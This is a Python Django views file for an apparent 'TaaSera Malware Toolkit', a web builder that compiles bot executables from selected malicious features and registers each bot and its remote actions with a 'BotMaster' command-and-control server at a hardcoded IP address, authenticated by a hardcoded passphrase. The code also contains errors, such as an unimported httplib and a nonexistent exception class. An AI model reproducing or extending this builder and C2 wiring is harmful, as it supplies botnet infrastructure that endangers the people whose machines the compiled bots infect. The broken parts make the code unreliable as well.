from django.shortcuts import render
from django.http import HttpResponse
from django.core.servers.basehttp import FileWrapper
from django.utils import datastructures
from django.views.decorators.csrf import csrf_exempt
from django.core.exceptions import ObjectDoesNotExist
from malware_toolkit.models import Feature, Function, \
    Function_Global_Variables, Function_Import, Header, Definition, Body, \
    Feature_Function, Feature_Type, Toolkit_Option, Feature_Global_Variables, \
    Feature_Import
import json
import DAO
from os import getcwd
from os import pardir
import sys
malware_compiler_path = getcwd() + '/malware_compiler'
print(malware_compiler_path)
sys.path.insert(0, malware_compiler_path)
from build import main
import re
import http.client, urllib, socket

# used to authenticate POSTs on the BotMaster
BOTMASTER_PASSPHRASE = 'A79BH4G9'

def index(request):

    # Construct a dictionary to pass to the template engine as its context.
    # Note the key boldmessage is the same as {{ boldmessage }} in the template!
    context_dict = {'boldmessage': "I am bold font from the context",
                    'message1': "this is a message"}

    # Return a rendered response to send to the client.
    # We make use of the shortcut function to make our lives easier.
    # Note that the first parameter is the template we wish to use.

    return render(request, 'malware_toolkit/index.html', context_dict)

def features(request):
    features = Feature.objects.all()
    functions = Function.objects.all()
    funcArray = []
    for f in functions:
        func = {}
        func['name'] = f.name
        # imports = DAO.get_records_from_table(Feature_Import, 'function', f.name)
        # global_vars = DAO.get_records_from_table(Feature_Global_Variables, 'function', f.name)
        h = DAO.get_records_from_table(Header, 'function', f.name)
        # if the function is just used for a #define, the set will be empty
        if len(h) > 0:
            func['header'] = h[0].text
        else:
            func['header'] = ''
        funcArray.append(func)
    feature_types = Feature_Type.objects.all()

    context_dict = {'features': features,
                    'functions': funcArray,
                    'feature_types': feature_types,
                    'title': "Malware Features",
                    }

    return render(request, 'malware_toolkit/features.html', context_dict)

def functions(request):
    functions = Function.objects.all()
    context_dict = {'functions': functions,
                    'title': "Malware Functions",
                    }

    return render(request, 'malware_toolkit/functions.html', context_dict)

def toolkit(request):
    features = {}
    types = Feature_Type.objects.all()
    for t in types:
        feats = Feature.objects.all().filter(feature_type=t)
        for f in feats:
            f.options = Toolkit_Option.objects.all().filter(feature=f)
        features[t.name] = feats

    context_dict = {'title': "TaaSera Malware Toolkit",
                    'type_1': "Execution Conditions",
                    'type_2': "Options",
                    'type_3': "Executable Features",
                    'type_4': "Action Sequence",
                    'type_5': "Failed Conditon Handler",
                    'features_1': features["Execution Condition"],
                    'features_2': features["Option"],
                    'features_3': features["Executable Feature"],
                    'features_4': features["Action Sequence"],
                    'features_5': features["Failed Cond Handler"],
                    'features': features,
                    }

    return render(request, 'malware_toolkit/toolkit.html', context_dict)

@csrf_exempt
def test(request):
    if request.method == "POST":
        postData = request.body
        print(postData)
        return HttpResponse(201)
    else:
        print("got a GET")
        getData = request.GET['city']
        print(getData)
        return HttpResponse(202)

@csrf_exempt
def add_function(request):
    if request.method == "POST":
        print(str(request.body))
        postData = re.split(r'\{\"(.+|\[+|\]+)\]\}', str(request.body))[1]
        jsonData = '{\"' + postData + "]}"
        func = json.loads(jsonData)
        funcObj = {}
        funcObj['name'] = func['name']
        funcObj['globals'] = func['global']
        funcObj['import'] = func['import']
        funcObj['declaration'] = func['declaration']
        funcObj['definition'] = func['definition']

        DAO.add_new_function(funcObj)

    return HttpResponse(200)

@csrf_exempt
def add_feature(request):
    if request.method == "POST":
        print(request.body)
        postData = re.split(r'{\"(.+|\[+|\]+)\]\}', str(request.body))[1]
        jsonData = '{\"' + postData + "]}"
        print(jsonData)
        feat = json.loads(jsonData)
        type_name = feat['type']
        feat_type = Feature_Type.objects.get_or_create(name=type_name)[0]

        featObj = {}
        featObj['name'] = feat['name']
        featObj['body'] = feat['body']
        featObj['globals'] = feat['global']
        featObj['import'] = feat['import']
        featObj['priority'] = feat['priority']
        featObj['functions'] = feat['functions']
        featObj['type'] = feat_type
        featObj['prompt'] = feat['prompt']
        featObj['options'] = feat['options']

        DAO.add_new_feature(featObj)

        # tell the BotMaster that a new action sequence is available
        if(type_name == 'Action Sequence'):
            sendAction(featObj['name'])

    return HttpResponse(200)

def get_imports(request):
    try:
        func = request.GET['name']
    except datastructures.MultiValueDictKeyError as e:
        return HttpResponse(400)

    imports = DAO.get_function_imports(func)
    parsed_i = []
    if(imports != None):
        for i in imports:
            parsed_i.append(i.text)
    return HttpResponse(json.dumps(parsed_i))

def get_function(request):
    if request.method == "DELETE":
        print(str(request.body))
        postData = re.split(r'\{\"(.+|\[+|\]+)\"\}', str(request.body))[1]
        jsonData = '{\"' + postData + "\"}"
        func = json.loads(jsonData)
        DAO.delete_function(func['name'])
        return HttpResponse(200)
    else:
        try:
            func = request.GET['name']
        except datastructures.MultiValueDictKeyError as e:
            return HttpResponse(400)

        funcObj = DAO.get_python_function_obj(func)
        if funcObj == None:
            return HttpResponse(400)

        return HttpResponse(json.dumps(funcObj))

def get_feature(request):
    if request.method == "DELETE":
        postData = re.split(r'\{\"(.+|\[+|\]+)\"\}', str(request.body))[1]
        jsonData = '{\"' + postData + "\"}"
        feat = json.loads(jsonData)
        DAO.delete_record_by_name(Feature, feat['name'])
        return HttpResponse(200)
    elif request.method == "GET":
        try:
            feat = request.GET['name']
        except datastructures.MultiValueDictKeyError as e:
            return HttpResponse(400)

        print("feat is " + feat)
        # try to find the feature, if it doesnt exist return 400
        feat = DAO.get_python_feature_obj(feat)
        if feat == None:
            return HttpResponse(400)
        return HttpResponse(json.dumps(feat))

@csrf_exempt
def build(request):
    if request.method == "POST":
        postData = re.split(r'\{\"(.+|\[+|\]+)\}', str(request.body))[1]
        postData = '{"' + postData + '}'
        jsonData = json.loads(postData)
        featList = {}
        # actionList will be used again when we send the list to the
        # BotMaster to record this Bots capabilites
        actionList = []
        if 'Execution Conditions' in jsonData:
            featList['Execution Conditions'] = []
            # gets a dict of all features in this category
            exeConds = jsonData['Execution Conditions']
            for f in exeConds:
                # str(f) gets the string representation of the feature
                # option in a list of 'option' checkbox values
                for option in exeConds[str(f)]:
                    # if the option that was checked was 'Yes'
                    # add the feature to the list
                    if option == "Yes":
                        featList['Execution Conditions'].append(str(f))
        if 'Options' in jsonData:
            featList['Options'] = []
            # gets a dict of all features in this category
            opts = jsonData['Options']
            for o in opts:
                # str(o) gets the string representation of the feature
                # option in a list of 'option' checkbox values
                for option in opts[str(o)]:
                    # if the option that was checked was 'Yes'
                    # add the feature to the list
                    if option == "Yes":
                        featList['Options'].append(str(o))
                        # if the option that was checked was 'Encode HTTP'
                        # let the botmaster know it can encode its http data
                        actionList.append(str(o))
        if 'Executable Features' in jsonData:
            featList['On Execution'] = []
            featList['As Remote Action'] = []
            # gets an dict of all features in this category
            exeFeats = jsonData['Executable Features']
            for f in exeFeats:
                # str(f) gets the string representation of the feature
                # option in a list of 'option' checkbox values
                for option in exeFeats[str(f)]:
                    # if the option that was checked was 'Yes'
                    # add this action to the list of actions the botmaster can sends
                    actionList.append(str(f))
                    # add the feature to the list
                    if option == "On Execution":
                        featList['On Execution'].append(str(f))
                    if option == "As Remote Action":
                        featList['As Remote Action'].append(str(f))
        if 'Action Sequence' in jsonData:
            featList['Action Sequence'] = []
            # gets an dict of all features in this category
            actionSeq = jsonData['Action Sequence']
            for f in actionSeq:
                # str(f) gets the string representation of the feature
                # option in a list of 'option' checkbox values
                for option in actionSeq[str(f)]:
                    # if the option that was checked was 'Yes'
                    # add this action to the list of actions the botmaster can sends
                    actionList.append(str(f))
                    # add the feature to the list
                    if option == "Yes":
                        featList['Action Sequence'].append(str(f))
        if 'Pull Times' in jsonData:
            featList['Pull Times'] = []
            times = jsonData['Pull Times']
            for t in times:
                featList['Pull Times'].append(str(t))
        if 'Action Limit' in jsonData:
            featList['Action Limit'] = jsonData['Action Limit']
        if 'Action Frequency' in jsonData:
            featList['Action Frequency'] = jsonData['Action Frequency']

    exePath, botID = main(featList)

    if exePath != -1:
        # if it failed the result will be -1 otherwise it'll be the path to the exe
        exePath = re.sub(r'\\', '/', exePath)
        filename = 'http://localhost:50000/' + exePath
        # send POST to the BotMaster with the bot's ID and a list of its available add_func_definitions
        success = sendBotActionList(actionList, botID)
        if success == True:
            return HttpResponse('200 ' + filename)
    return HttpResponse(503)

# sends a new action to the BotMaster, when new feature are added to the toolkit
@csrf_exempt
def sendAction(action):
    data = {'passphrase': BOTMASTER_PASSPHRASE, \
                               'action': action}
    jsonData = json.dumps(data)
    conn = httplib.HTTPConnection("70.61.16.8:50000")
    conn.request("POST", "/database/api/add_action/", jsonData)
    res = conn.getresponse()
    # if the response is a success
    if res.read() == '200':
        print("New Action successfully added to BotMaster")
    else:
        print("Failed to send new action to BotMaster")
    conn.close()

# sends a list of actions to the BotMaster that this bot is capable of performing
@csrf_exempt
def sendBotActionList(actions, botID):
    data = {'passphrase': BOTMASTER_PASSPHRASE, \
                               'bot': botID, \
                               'actions': actions}
    jsonData = json.dumps(data)
    conn = http.client.HTTPConnection("localhost:50001")
    try:
        conn.request("POST", "/database/api/add_bot/", jsonData)
        res = conn.getresponse()
        conn.close()
        # if the response is a success
        strRes = res.read().decode("utf-8")
        if strRes == '200':
            print("List of bot actions successfully sent to BotMaster")
            return True;
        else:
            print("Failed to send list of bot actions to BotMaster")

    except(http.HTTPException, socket.error) as ex:
        print("Error: %s" % ex)
    conn.close()
    return False

def make_array(qSet):
    array = []
    if(qSet != None):
        for s in qSet:
            array.append(s.text)
    return array
